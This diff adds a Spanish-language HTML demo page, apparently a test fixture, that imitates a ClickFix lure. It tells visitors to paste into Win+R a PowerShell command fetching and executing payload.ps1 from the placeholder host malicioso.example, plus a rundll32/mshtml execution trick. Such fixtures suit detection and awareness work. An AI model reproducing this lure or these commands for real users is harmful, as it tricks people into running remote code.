@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Demo ClickFix - Sitio de prueba</title>
+    <style>
+      body {
+        font-family: system-ui, sans-serif;
+        margin: 24px;
+        color: #0f172a;
+      }
+      .card {
+        border: 1px solid #e2e8f0;
+        border-radius: 12px;
+        padding: 16px;
+        max-width: 720px;
+        background: #f8fafc;
+      }
+      code {
+        background: #111827;
+        color: #f9fafb;
+        padding: 2px 6px;
+        border-radius: 4px;
+      }
+      .cta {
+        margin-top: 16px;
+        padding: 10px 14px;
+        background: #dc2626;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Actualiza tu PC (demo sospechosa)</h1>
+      <p>
+        Para solucionar el error, abre el <strong>Run dialog</strong> con <strong>Win + R</strong> y pega el comando
+        siguiente:
+      </p>
+      <p>
+        <code>powershell -Command "Invoke-WebRequest http://malicioso.example/payload.ps1 | iex"</code>
+      </p>
+      <p>
+        Si no funciona, intenta con:
+      </p>
+      <p>
+        <code>cmd /c rundll32.exe javascript:"\"\\..\\mshtml,RunHTMLApplication\"";document.write();</code>
+      </p>
+      <button class="cta" type="button">Copiar instrucciones</button>
+    </div>
+  </body>
+</html>
